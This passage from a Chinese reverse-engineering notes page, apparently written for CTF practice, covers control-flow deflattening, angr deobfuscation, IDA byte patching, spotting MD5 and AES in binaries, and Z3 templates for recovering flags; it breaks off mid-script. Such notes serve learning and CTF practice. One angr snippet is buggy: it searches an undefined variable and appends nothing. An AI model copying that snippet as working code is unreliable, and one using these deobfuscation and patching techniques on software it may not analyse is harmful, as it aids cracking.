          <a href="#六、控制流去平坦化" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、控制流去平坦化" class="headerlink" title="六、控制流去平坦化"></a>六、控制流去平坦化</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/cq674350529/deflat" >cq674350529/deflat: use angr to deobfuscation (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211201112027.png" alt="image-20211201112020849"></p>
<p>以上类型的就是平坦化之后的，需要找到函数入口进行去除，之后即可得到去除后的</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f binary --addr 0x400530</span><br></pre></td></tr></table></div></figure>




        <h1 id="七、去混淆"   >
          <a href="#七、去混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、去混淆" class="headerlink" title="七、去混淆"></a>七、去混淆</h1>
      
        <h2 id="1-利用angr"   >
          <a href="#1-利用angr" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用angr" class="headerlink" title="1.利用angr"></a>1.利用angr</h2>
      <p>使用代码查找内存，找到混淆的地方，然后通过avoid来去除</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">binary = <span class="built_in">open</span>(<span class="string">&#x27;./yolomolo&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">avoids = []</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    index = e.find(<span class="string">b&#x27;\xB9\x00\x00\x00\x00&#x27;</span>,index+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    addr = <span class="number">0x400000</span> + index</span><br><span class="line">    avoids.append()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(avoids))</span><br><span class="line"><span class="built_in">print</span> (avoids)</span><br></pre></td></tr></table></div></figure>

<p>查找内存中的机器码为<code>&#39;\xB9\x00\x00\x00\x00&#39;</code>的地方，即<code>mov ecx 0</code>，这个为一些混淆的标志。</p>
<p>即找到混淆的标志点，然后通过avoid来去除。</p>

        <h1 id="八、批量修改数据"   >
          <a href="#八、批量修改数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、批量修改数据" class="headerlink" title="八、批量修改数据"></a>八、批量修改数据</h1>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 <span class="keyword">import</span>*</span><br><span class="line">addr = <span class="number">0x401807</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x401823</span>-<span class="number">0x401807</span>):</span><br><span class="line">    PatchByte(addr +i, Byte(addr+i)^<span class="number">0x90</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="九、加密算法"   >
          <a href="#九、加密算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、加密算法" class="headerlink" title="九、加密算法"></a>九、加密算法</h1>
      
        <h2 id="1-md5"   >
          <a href="#1-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-md5" class="headerlink" title="1.md5"></a>1.md5</h2>
      <p>标识符：0x123456789</p>
<p>常见形式如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728143855425.png" alt="image-20230728143855425"></p>

        <h2 id="2-AES"   >
          <a href="#2-AES" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-AES" class="headerlink" title="2.AES:"></a>2.AES:</h2>
      
        <h3 id="加密流程："   >
          <a href="#加密流程：" class="heading-link"><i class="fas fa-link"></i></a><a href="#加密流程：" class="headerlink" title="加密流程："></a>加密流程：</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png" alt="image-AES"></p>
<p>首先轮密钥加(KeyAdd)</p>
<p>9轮循环：字节替换(substitution)、行移位(ShifRow)、列混淆(MixColumn)、轮密钥加(KeyAdd)</p>
<p>第10轮循环：字节替换(substitution)、行移位(ShifRow)、轮密钥加(KeyAdd)</p>
<p>第十轮没有列混淆，加密过程常见如下，函数名称是用Finger识别的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230728144000135.png" alt="image-20230728144000135"></p>

        <h3 id="密钥扩展："   >
          <a href="#密钥扩展：" class="heading-link"><i class="fas fa-link"></i></a><a href="#密钥扩展：" class="headerlink" title="密钥扩展："></a>密钥扩展：</h3>
      <p>先for循环4次，再for循环40次，属于密钥扩展</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801110448511.png" alt="image-20230801110448511"></p>

        <h3 id="判断模式："   >
          <a href="#判断模式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断模式：" class="headerlink" title="判断模式："></a>判断模式：</h3>
      <p>如果密文的长度是16字节的整数倍，并且没有任何重复的块，那么可能是CTR或OFB模式3。<br>如果密文的长度是16字节的整数倍，并且有重复的块，那么可能是ECB或CBC模式3。ECB模式下，相同的明文块会产生相同的密文块，所以重复的块更容易被发现1。CBC模式下，相同的明文块不一定会产生相同的密文块，因为每个块都与前一个块进行异或操作1。但是如果明文中有大量的零或其他常数值，那么CBC模式下也可能出现重复的块3。<br>如果密文的长度不是16字节的整数倍，那么可能是CFB模式3。CFB模式下，可以对任意长度的明文进行加密，而不需要进行填充1。<br>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41853048/article/details/131771420" >https://blog.csdn.net/qq_41853048/article/details/131771420</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="脚本使用"   >
          <a href="#脚本使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">key = <span class="string">b&#x27;\xcb\x8d\x49\x35\x21\xb4\x7a\x4c\xc1\xae\x7e\x62\x22\x92\x66\xce&#x27;</span></span><br><span class="line">text = <span class="string">b&#x27;\xBC\x0A\xAD\xC0\x14\x7C\x5E\xCC\xE0\xB1\x40\xBC\x9C\x51\xD5\x2B\x46\xB2\xB9\x43\x4D\xE5\x32\x4B\xAD\x7F\xB4\xB3\x9C\xDB\x4B\x5B&#x27;</span></span><br><span class="line">cryptos = AES.new(key, mode)</span><br><span class="line">cipher_text = cryptos.decrypt(text)</span><br><span class="line">t = b2a_hex(cipher_text).decode()</span><br><span class="line">t = re.findall(<span class="string">&quot;.&#123;2&#125;&quot;</span>, t)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(x, <span class="number">16</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>






        <h1 id="十、Z3求解"   >
          <a href="#十、Z3求解" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、Z3求解" class="headerlink" title="十、Z3求解"></a>十、Z3求解</h1>
      <p>几个常见模板</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">a1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    a1.append(BitVec(<span class="string">&#x27;a1%d&#x27;</span> % i, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">s = Solver()</span><br><span class="line">s.add(And((a1[<span class="number">5</span>] ^ (a1[<span class="number">8</span>] * a1[<span class="number">8</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x33</span>) == <span class="number">9600</span></span><br><span class="line">    , ((a1[<span class="number">30</span>] + a1[<span class="number">27</span>] + a1[<span class="number">24</span>] + a1[<span class="number">11</span>] - a1[<span class="number">12</span>] - a1[<span class="number">0</span>] * a1[<span class="number">15</span>] * a1[<span class="number">7</span>]) ^ <span class="number">0x64</span>) == -<span class="number">344791</span></span><br><span class="line">    , ((a1[<span class="number">8</span>] + a1[<span class="number">16</span>] * a1[<span class="number">29</span>] * a1[<span class="number">1</span>] - a1[<span class="number">25</span>]) ^ <span class="number">0x62</span>) == <span class="number">406716</span></span><br><span class="line">    , ((a1[<span class="number">4</span>] - a1[<span class="number">1</span>]) ^ (a1[<span class="number">0</span>] * a1[<span class="number">31</span>] + a1[<span class="number">28</span>] - a1[<span class="number">26</span>]) ^ a1[<span class="number">13</span>] ^ <span class="number">0x66</span>) == -<span class="number">8688</span></span><br><span class="line">    , ((a1[<span class="number">13</span>] + a1[<span class="number">18</span>] + a1[<span class="number">3</span>] * a1[<span class="number">7</span>] - a1[<span class="number">23</span>] - a1[<span class="number">3</span>]) ^ <span class="number">0x66</span>) == <span class="number">3085</span></span><br><span class="line">    , ((a1[<span class="number">18</span>] - a1[<span class="number">1</span>] * a1[<span class="number">29</span>]) ^ (a1[<span class="number">30</span>] + a1[<span class="number">22</span>] - a1[<span class="number">1</span>]) ^ a1[<span class="number">15</span>] ^ (a1[<span class="number">2</span>] * a1[<span class="number">31</span>]) ^ <span class="number">0x35</span>) == -<span class="number">16248</span></span><br><span class="line">    , ((a1[<span class="number">3</span>] * a1[<span class="number">21</span>] + a1[<span class="number">29</span>] + a1[<span class="number">25</span>] + a1[<span class="number">4</span>] * a1[<span class="number">23</span>] - a1[<span class="number">2</span>] * a1[<span class="number">7</span>] - a1[<span class="number">21</span>]) ^ <span class="number">0x65</span>) == <span class="number">4469</span></span><br><span class="line">    , ((a1[<span class="number">3</span>] + a1[<span class="number">1</span>] - a1[<span class="number">2</span>]) ^ (a1[<span class="number">23</span>] * a1[<span class="number">23</span>]) ^ <span class="number">0x61</span>) == <span class="number">2761</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">11</span>]) ^ (a1[<span class="number">8</span>] * a1[<span class="number">21</span>]) ^ a1[<span class="number">29</span>] ^ <span class="number">0x39</span>) == <span class="number">7832</span> ))</span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">7</span>] * a1[<span class="number">11</span>] * a1[<span class="number">8</span>] + a1[<span class="number">14</span>]) ^ (a1[<span class="number">10</span>] + <span class="number">2</span> * a1[<span class="number">25</span>]) ^ (a1[<span class="number">10</span>] * a1[<span class="number">15</span>]) ^ <span class="number">0x61</span>) == <span class="number">234968</span></span><br><span class="line">    , (a1[<span class="number">8</span>] ^ (a1[<span class="number">19</span>] + a1[<span class="number">27</span>] + a1[<span class="number">19</span>] * a1[<span class="number">0</span>] + a1[<span class="number">9</span>] * a1[<span class="number">25</span>]) ^ a1[<span class="number">28</span>] ^ a1[<span class="number">7</span>] ^ <span class="number">0x30</span>) == <span class="number">11738</span></span><br><span class="line">    , ((a1[<span class="number">32</span>] - a1[<span class="number">1</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">14</span>] - a1[<span class="number">2</span>] * a1[<span class="number">21</span>]) ^ a1[<span class="number">21</span>] ^ <span class="number">0x38</span>) == <span class="number">3252</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">32</span>]) ^ (a1[<span class="number">8</span>] + a1[<span class="number">0</span>] - a1[<span class="number">5</span>] - a1[<span class="number">11</span>]) ^ a1[<span class="number">21</span>] ^ (a1[<span class="number">2</span>] - a1[<span class="number">12</span>]) ^ <span class="number">0x32</span>) == -<span class="number">2673</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">0</span>] + a1[<span class="number">1</span>]) ^ (a1[<span class="number">6</span>] - a1[<span class="number">19</span>] - a1[<span class="number">22</span>]) ^ <span class="number">0x64</span>) == -<span class="number">164</span></span><br><span class="line">    , ((a1[<span class="number">25</span>] - a1[<span class="number">0</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">4</span>] + a1[<span class="number">31</span>] * a1[<span class="number">31</span>] + a1[<span class="number">2</span>] - a1[<span class="number">32</span>]) ^ <span class="number">0x30</span>) == -<span class="number">15811</span></span><br><span class="line">    , (a1[<span class="number">6</span>] ^ (a1[<span class="number">5</span>] + a1[<span class="number">15</span>] * a1[<span class="number">32</span>] - a1[<span class="number">32</span>] * a1[<span class="number">19</span>] * a1[<span class="number">22</span>]) ^ a1[<span class="number">8</span>] ^ <span class="number">0x61</span>) == -<span class="number">167332</span></span><br><span class="line">    , ((a1[<span class="number">26</span>] + a1[<span class="number">32</span>] * a1[<span class="number">24</span>] - a1[<span class="number">10</span>]) ^ (a1[<span class="number">11</span>] * a1[<span class="number">3</span>] - a1[<span class="number">30</span>] - a1[<span class="number">27</span>] - a1[<span class="number">31</span>]) ^ <span class="number">0x64</span>) == <span class="number">3470</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">15</span>]) ^ (a1[<span class="number">18</span>] * a1[<span class="number">25</span>] + a1[<span class="number">14</span>] + a1[<span class="number">2</span>] + a1[<span class="number">26</span>] + a1[<span class="number">27</span>]) ^ a1[<span class="number">29</span>] ^ <span class="number">0x38</span>) == <span class="number">4323</span></span><br><span class="line">    , ((a1[<span class="number">29</span>] * a1[<span class="number">8</span>] * a1[<span class="number">21</span>] * a1[<span class="number">27</span>] + a1[<span class="number">13</span>] - a1[<span class="number">7</span>]) ^ a1[<span class="number">5</span>] ^ <span class="number">0x39</span>) == <span class="number">25234850</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">0</span>] * a1[<span class="number">8</span>] * a1[<span class="number">13</span>] + a1[<span class="number">6</span>] + a1[<span class="number">19</span>] * a1[<span class="number">23</span>] - a1[<span class="number">2</span>]) ^ <span class="number">0x62</span>) == <span class="number">394534</span></span><br><span class="line">    , ((a1[<span class="number">14</span>] + a1[<span class="number">30</span>] + a1[<span class="number">14</span>] - a1[<span class="number">30</span>] - a1[<span class="number">2</span>] * a1[<span class="number">30</span>] * a1[<span class="number">1</span>] * a1[<span class="number">17</span>] - a1[<span class="number">2</span>]) ^ <span class="number">0x35</span>) == -<span class="number">15531747</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">14</span>]) ^ (a1[<span class="number">13</span>] - a1[<span class="number">27</span>] * a1[<span class="number">32</span>]) ^ <span class="number">0x33</span>) == -<span class="number">9992</span></span><br><span class="line">    , (a1[<span class="number">11</span>] ^ a1[<span class="number">25</span>] ^ a1[<span class="number">12</span>] ^ a1[<span class="number">2</span>] ^ (a1[<span class="number">11</span>] + a1[<span class="number">29</span>] - a1[<span class="number">24</span>]) ^ <span class="number">0x32</span>) == <span class="number">117</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">20</span>] + a1[<span class="number">0</span>] + a1[<span class="number">8</span>] * a1[<span class="number">6</span>] * a1[<span class="number">8</span>] * a1[<span class="number">0</span>] - a1[<span class="number">19</span>]) ^ <span class="number">0x62</span>) == <span class="number">83181080</span></span><br><span class="line">    , ((a1[<span class="number">14</span>] * a1[<span class="number">32</span>] + a1[<span class="number">29</span>] + a1[<span class="number">22</span>] - a1[<span class="number">18</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x64</span>) == <span class="number">3243</span></span><br><span class="line">    , ((a1[<span class="number">18</span>] - a1[<span class="number">4</span>]) ^ (a1[<span class="number">16</span>] + a1[<span class="number">7</span>]) ^ (a1[<span class="number">14</span>] + a1[<span class="number">18</span>] - a1[<span class="number">7</span>] - a1[<span class="number">14</span>]) ^ <span class="number">0x65</span>) == -<span class="number">25</span></span><br><span class="line">    , ((a1[<span class="number">13</span>] - a1[<span class="number">7</span>]) ^ (a1[<span class="number">2</span>] - a1[<span class="number">13</span>]) ^ (a1[<span class="number">0</span>] - a1[<span class="number">4</span>] - a1[<span class="number">14</span>] - a1[<span class="number">13</span>] - a1[<span class="number">26</span>]) ^ <span class="number">0x65</span>) == -<span class="number">363</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] + a1[<span class="number">10</span>] + a1[<span class="number">7</span>] * a1[<span class="number">14</span>] * a1[<span class="number">7</span>]) ^ (a1[<span class="number">17</span>] + a1[<span class="number">5</span>] * a1[<span class="number">8</span>]) ^ <span class="number">0x37</span>) == <span class="number">239501</span></span><br><span class="line">    , (a1[<span class="number">5</span>] ^ (a1[<span class="number">15</span>] * a1[<span class="number">24</span>]) ^ <span class="number">0x61</span>) == <span class="number">5026</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(And((a1[<span class="number">9</span>] ^ (a1[<span class="number">28</span>] * a1[<span class="number">0</span>]) ^ (a1[<span class="number">29</span>] + a1[<span class="number">12</span>] + a1[<span class="number">16</span>]) ^ <span class="number">0x37</span>) == <span class="number">7058</span></span><br><span class="line">    , ((a1[<span class="number">6</span>] * a1[<span class="number">8</span>] + a1[<span class="number">6</span>]) ^ (a1[<span class="number">18</span>] - a1[<span class="number">7</span>]) ^ <span class="number">0x65</span>) == <span class="number">12399</span></span><br><span class="line">    , ((a1[<span class="number">12</span>] + a1[<span class="number">8</span>]) ^ (a1[<span class="number">1</span>] - a1[<span class="number">1</span>] * a1[<span class="number">32</span>] * a1[<span class="number">30</span>]) ^ <span class="number">0x30</span>) == -<span class="number">151548</span></span><br><span class="line">    , ((a1[<span class="number">4</span>] + a1[<span class="number">32</span>] * a1[<span class="number">18</span>] + a1[<span class="number">22</span>] - a1[<span class="number">12</span>] - a1[<span class="number">22</span>] - a1[<span class="number">12</span>]) ^ <span class="number">0x30</span>) == <span class="number">1624</span></span><br><span class="line">    , ((a1[<span class="number">9</span>] * a1[<span class="number">3</span>]) ^ (a1[<span class="number">26</span>] + a1[<span class="number">13</span>]) ^ a1[<span class="number">23</span>] ^ <span class="number">0x65</span>) == <span class="number">6569</span></span><br><span class="line">    , ((a1[<span class="number">17</span>] - a1[<span class="number">3</span>]) ^ (a1[<span class="number">14</span>] * a1[<span class="number">26</span>] * a1[<span class="number">11</span>] * a1[<span class="number">25</span>]) ^ <span class="number">0x61</span>) == -<span class="number">24990047</span></span><br><span class="line">    , ((a1[<span class="number">22</span>] - a1[<span class="number">0</span>]) ^ (a1[<span class="number">2</span>] - a1[<span class="number">31</span>] - a1[<span class="number">13</span>] - a1[<span class="number">5</span>] - a1[<span class="number">28</span>]) ^ <span class="number">0x65</span>) == <span class="number">372</span></span><br><span class="line">    , (a1[<span class="number">8</span>] ^ (a1[<span class="number">4</span>] * a1[<span class="number">14</span>] + a1[<span class="number">20</span>] + a1[<span class="number">19</span>] + a1[<span class="number">25</span>] + a1[<span class="number">21</span>] * a1[<span class="number">8</span>] - a1[<span class="number">1</span>]) ^ <span class="number">0x63</span>) == <span class="number">13326</span></span><br><span class="line">    , ((a1[<span class="number">8</span>] + a1[<span class="number">29</span>] - a1[<span class="number">25</span>] - a1[<span class="number">32</span>]) ^ (a1[<span class="number">24</span>] * a1[<span class="number">4</span>]) ^ <span class="number">0x62</span>) == <span class="number">3910</span></span><br><span class="line">    , ((a1[<span class="number">2</span>] * a1[<span class="number">15</span>] + a1[<span class="number">27</span>] - a1[<span class="number">30</span>] * a1[<span class="number">29</span>]) ^ <span class="number">0x37</span>) == <span class="number">1316</span>))</span><br><span class="line"></span><br><span class="line">s.add(And(((a1[<span class="number">5</span>] - a1[<span class="number">2</span>] * a1[<span class="number">24</span>]) ^ (a1[<span class="number">21</span>] - a1[<span class="number">20</span>]) ^ a1[<span class="number">7</span>] ^ <span class="number">0x64</span>) == <span class="number">3290</span></span><br><span class="line">    , ((a1[<span class="number">9</span>] * a1[<span class="number">15</span>]) ^ (a1[<span class="number">7</span>] - a1[<span class="number">14</span>]) ^ a1[<span class="number">2</span>] ^ <span class="number">0x37</span>) == -<span class="number">10137</span></span><br><span class="line">    , ((a1[<span class="number">5</span>] * a1[<span class="number">6</span>] + a1[<span class="number">26</span>]) ^ (a1[<span class="number">11</span>] + a1[<span class="number">3</span>]) ^ <span class="number">0x61</span>) == <span class="number">8601</span></span><br><span class="line">    , (a1[<span class="number">3</span>] ^ (a1[<span class="number">8</span>] + a1[<span class="number">16</span>] + a1[<span class="number">27</span>]) ^ (a1[<span class="number">28</span>] + a1[<span class="number">31</span>] * a1[<span class="number">12</span>] + a1[<span class="number">21</span>]) ^ <span class="number">0x35</span>) == <span class="number">12752</span></span><br><span class="line">    , (a1[<span class="number">2</span>] ^ (a1[<span class="number">6</span>] - a1[<span class="number">20</span>] - a1[<span class="number">8</span>] * a1[<span class="number">9</span>]) ^ (a1[<span class="number">16</span>] + a1[<span class="number">6</span>]) ^ <span class="number">0x63</span>) == -<span class="number">9964</span></span><br><span class="line">    , ((a1[<span class="number">1</span>] * a1[<span class="number">2</span>] * a1[<span class="number">32</span>]) ^ (a1[<span class="number">29</span>] + a1[<span class="number">27</span>]) ^ (a1[<span class="number">1</span>] * a1[<span class="number">18</span>] * a1[<span class="number">8</span>]) ^ <span class="number">0x35</span>) == <span class="number">283359</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	s.add(a1[i] == <span class="built_in">ord</span>(<span class="string">&#x27;ESCAPE&#123;&#x27;</span>[i]))</span><br><span class="line">        </span><br><span class="line">flg = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    s.model().sorts()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        flg +=  <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="built_in">str</span>(s.model().<span class="built_in">eval</span>(a1[i]))))</span><br><span class="line">    <span class="built_in">print</span>(flg)</span><br></pre></td></tr></table></div></figure>

<p>在s.add中间需要用And(xx,xxx)来进行2个条件联合约束</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">s = Solver()</span><br><span class="line">v1 = Real(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2 = Real(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3 = Real(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4 = Real(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5 = Real(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6 = Real(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7 = Real(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8 = Real(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Real(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v11 = Real(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (</span><br><span class="line">            v6 * <span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + 